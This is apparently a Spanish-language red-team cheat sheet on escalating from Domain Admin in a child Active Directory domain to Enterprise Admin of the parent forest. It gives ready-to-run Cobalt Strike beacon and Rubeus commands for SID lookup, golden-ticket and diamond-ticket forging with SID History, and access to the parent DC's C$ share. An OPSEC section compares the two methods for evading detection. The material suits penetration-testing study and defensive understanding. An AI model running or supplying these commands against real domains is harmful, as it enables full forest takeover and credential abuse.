---
tags: [ad, trusts, privilege-escalation, golden-ticket, diamond-ticket, sid-history]
status: completo
---

# Parent-Child Trusts

> Trust automático bidireccional transitivo creado al agregar un subdominio. Un DA en el dominio hijo puede escalar a EA del forest padre mediante SID History forging.

## Prerequisito: Obtener SID del Dominio Padre

```
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
→ objectSid: S-1-5-21-3926355307-1661546229-813047887
```

Enterprise Admins SID = `<parent_SID>-519`

---

## Método 1: Golden Ticket con SID History (Offline)

```
Rubeus.exe golden /aes256:<child_krbtgt_aes256> /user:Administrator /domain:<child_domain> /sid:<child_SID> /sids:<parent_S-1-5-21-...-519> /nowrap
```

| Parámetro | Descripción |
|-----------|-------------|
| `/aes256` | AES256 del krbtgt del dominio HIJO |
| `/domain` | FQDN del dominio hijo |
| `/sid` | SID del dominio hijo |
| `/sids` | SID del grupo Enterprise Admins del padre (`<parent_SID>-519`) |

Usar el ticket:
```
beacon> make_token CONTOSO\Administrator Passw0rd!  # o ptt con el ticket
beacon> ls \\lon-dc-1.contoso.com\c$
```

---

## Método 2: Diamond Ticket (Online, Más Sigiloso)

```
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:<RID> /sids:<EA_SID> /krbkey:<aes256_krbtgt_hijo> /nowrap
```

| Parámetro | Descripción |
|-----------|-------------|
| `/tgtdeleg` | Delega el TGT actual para obtener un TGT válido |
| `/ticketuser` | Usuario a impersonar |
| `/ticketuserid` | RID del usuario |
| `/sids` | SID del EA group del padre |
| `/krbkey` | AES256 del krbtgt del dominio hijo |

## OPSEC

- Diamond ticket es más sigiloso (parte de un TGT legítimo)
- Golden ticket crea un TGT completamente forjado — mayor riesgo de detección
- Ambos abusan de SID History en el PAC del ticket

## Ver también

- [[05-ad-attacks/trusts|Trusts]]
- [[05-ad-attacks/trusts/inter-realm-tickets|Inter-Realm Tickets]]
- [[05-ad-attacks/ataques/golden-ticket|Golden Ticket]]
